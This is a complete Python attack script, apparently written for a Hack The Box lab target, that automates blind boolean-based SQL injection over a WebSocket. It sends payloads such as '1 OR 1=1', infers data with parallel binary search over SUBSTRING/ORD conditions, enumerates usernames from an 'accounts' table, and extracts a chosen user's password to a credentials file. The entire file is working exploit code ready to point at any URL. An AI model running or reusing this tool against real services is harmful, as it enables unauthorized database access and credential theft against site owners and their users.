#!/usr/bin/env python3
"""
<3 WebSocket SQL Injection Extractor
Author: Shura 
Description: A robust and reusable script to discover and extract data via blind boolean-based WebSocket SQLi.
"""

import websocket
import json
import time
import sys
import threading
import argparse
from concurrent.futures import ThreadPoolExecutor

# Lock for synchronized printing
print_lock = threading.Lock()

class WebSocketSQLi:
    def __init__(self, url, timeout=10):
        self.url = url
        self.timeout = timeout
        self.true_msg = None
        self.false_msg = None

    ### MÉTODO CORRIGIDO PARA SER THREAD-SAFE ###
    def _send_and_get(self, payload):
        """
        Sends a payload and waits for a single response.
        This method is now thread-safe and does not use instance variables for results.
        """
        # Use a local container for the response to avoid race conditions.
        response_container = {'result': None}
        event = threading.Event()

        def on_message(ws, message):
            response_container['result'] = message
            event.set()
            ws.close()

        def on_error(ws, error):
            # Store the error to distinguish it from a timeout
            response_container['result'] = f"Error: {error}"
            event.set()

        def on_open(ws):
            ws.send(json.dumps({'id': payload}))

        ws = websocket.WebSocketApp(
            self.url, on_open=on_open, on_message=on_message, on_error=on_error
        )
        wst = threading.Thread(target=ws.run_forever, daemon=True)
        wst.start()
        
        # Wait for the event to be set, or timeout
        finished = event.wait(timeout=self.timeout)
        
        # If the wait timed out, result will still be None
        if not finished:
            try:
                ws.close()
            except Exception:
                pass
        
        return response_container['result']

    def calibrate_truth(self):
        print("[+] Calibrating TRUE/FALSE responses...")
        true_resp = self._send_and_get('1 OR 1=1')
        false_resp = self._send_and_get('1 AND 1=2')
        if true_resp is None or false_resp is None:
            raise RuntimeError("Failed to get a response from the server during calibration.")
        if true_resp == false_resp:
            raise RuntimeError(f"Calibration failed: TRUE and FALSE return the same response: '{true_resp}'")
        self.true_msg, self.false_msg = true_resp, false_resp
        with print_lock:
            print(f"[✓] Calibration successful: TRUE='{self.true_msg}' | FALSE='{self.false_msg}'")

    def test_condition(self, condition):
        if not self.true_msg:
            self.calibrate_truth()
            
        payload = f'1 OR ({condition})'
        resp = self._send_and_get(payload)
        
        # Simple retry for intermittent network issues
        if resp is None:
            time.sleep(0.5)
            resp = self._send_and_get(payload)
            
        return resp == self.true_msg

# O resto do script permanece o mesmo, pois o erro estava contido na classe WebSocketSQLi.
def get_data_length(sqli, query):
    with print_lock: print(f"[+] Discovering length for query: {query}")
    for length in range(1, 100):
        condition = f'LENGTH(({query})) = {length}'
        if sqli.test_condition(condition):
            with print_lock: print(f"[✓] Determined length: {length}")
            return length
        print(f"[.] Testing length {length}...", end='\r'); sys.stdout.flush()
    with print_lock: print("\n[!] Could not determine length. Check query or increase range.")
    return None

def extract_char_binary_search(sqli, query, position):
    low, high, found_char_code = 32, 126, -1
    while low <= high:
        mid = (low + high) // 2
        condition = f'ORD(BINARY SUBSTRING(({query}), {position}, 1)) >= {mid}'
        if sqli.test_condition(condition): found_char_code = mid; low = mid + 1
        else: high = mid - 1
    if 32 <= found_char_code <= 126: return chr(found_char_code)
    return None

def extract_data_parallel(sqli, query, length, max_workers):
    with print_lock:
        print(f"[+] Extracting {length} characters in parallel with {max_workers} workers...")
    result_chars = ['?'] * length
    def extract_and_update(pos):
        char = extract_char_binary_search(sqli, query, pos)
        with print_lock:
            if char is not None:
                result_chars[pos - 1] = char
                print(f"[✓] Position {pos:02d}/{length:02d}: '{char}' found.")
            else:
                print(f"[!] Failed to find character at position {pos}")
    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        futures = [executor.submit(extract_and_update, pos) for pos in range(1, length + 1)]
        for future in futures:
            try: future.result(timeout=180)
            except Exception as e:
                with print_lock: print(f"[!] A thread encountered an error: {e}")
    return "".join(result_chars)

def discover_users(sqli, args):
    print("\n" + "="*60 + "\n🕵️  Starting User Discovery Mode\n" + "="*60)
    print("[+] Determining total number of users...")
    count_query = "SELECT COUNT(username) FROM accounts"
    user_count = 0
    for i in range(1, 21):
        if sqli.test_condition(f"({count_query}) = {i}"):
            user_count = i; break
    if user_count == 0: print("[!] No users found."); return None
    print(f"[✓] Found {user_count} user(s).")
    found_users = []
    for i in range(user_count):
        print(f"\n[+] Extracting username #{i+1}...")
        user_query = f"SELECT username FROM accounts LIMIT {i},1"
        length = get_data_length(sqli, user_query)
        if not length: print(f"[!] Failed to get length for username #{i+1}."); continue
        username = extract_data_parallel(sqli, user_query, length, args.workers)
        if '?' not in username: print(f"[🎯] Found username: {username}"); found_users.append(username)
        else: print(f"[!] Failed to extract username #{i+1}. Partial: {username}")
    return found_users

def main():
    parser = argparse.ArgumentParser(description="Advanced WebSocket SQL Injection Extractor.", formatter_class=argparse.RawTextHelpFormatter)
    parser.add_argument("-u", "--url", default="ws://soc-player.soccer.htb:9091/", help="Target WebSocket URL.")
    parser.add_argument("-w", "--workers", type=int, default=10, help="Number of parallel workers.")
    parser.add_argument("--discover-users", action='store_true', help="Discover all usernames from the 'accounts' table.")
    parser.add_argument("--get-password", metavar="USERNAME", help="Get the password for a specific username.")
    args = parser.parse_args()
    print("="*60 + "\n🎯 Advanced WebSocket SQL Injection Extractor\n" + "="*60)
    print(f"[*] Target URL: {args.url}")
    if not args.discover_users and not args.get_password:
        parser.print_help()
        print("\n[!] Error: You must choose a mode: --discover-users or --get-password <username>")
        sys.exit(1)
    try:
        sqli = WebSocketSQLi(args.url)
        sqli.calibrate_truth()
        if args.discover_users:
            found_users = discover_users(sqli, args)
            if found_users:
                print("\n" + "="*60 + "\nDiscovery Complete. Found users:")
                for user in found_users: print(f"  - {user}")
                print(f"\nNow, run again with --get-password <username> to extract a password.")
                print(f"Example: python3 {sys.argv[0]} --get-password {found_users[0]}")
                print("="*60)
            return
        if args.get_password:
            username_to_get = args.get_password
            print("\n" + "="*60 + f"\n🔑 Starting Password Extraction for user: '{username_to_get}'\n" + "="*60)
            query = f'SELECT password FROM accounts WHERE username="{username_to_get}"'
            length = get_data_length(sqli, query)
            if not length:
                if not sqli.test_condition(f'EXISTS({query})'): print(f"[!] Error: User '{username_to_get}' does not exist.")
                else: print("[!] Error: Could not determine password length, but user exists.")
                sys.exit(1)
            password = extract_data_parallel(sqli, query, length, args.workers)
            if '?' not in password:
                print("\n" + "="*60 + "\n[🎯] EXTRACTION SUCCESSFUL!")
                print(f"    Username: {username_to_get}")
                print(f"    Password: {password}")
                print("="*60)
                creds_file = f"{username_to_get}_credentials.txt"
                with open(creds_file, 'w') as f: f.write(f"{username_to_get}:{password}\n")
                print(f"[✓] Credentials saved to {creds_file}")
            else:
                print(f"\n[!] Extraction failed or incomplete. Partial result: {password}")
    except KeyboardInterrupt: print("\n[!] Operation cancelled by user.")
    except Exception as e: print(f"\n[!] An unexpected error occurred: {e}", file=sys.stderr)
    finally: print("[*] Script finished.")

if __name__ == "__main__":
    main()
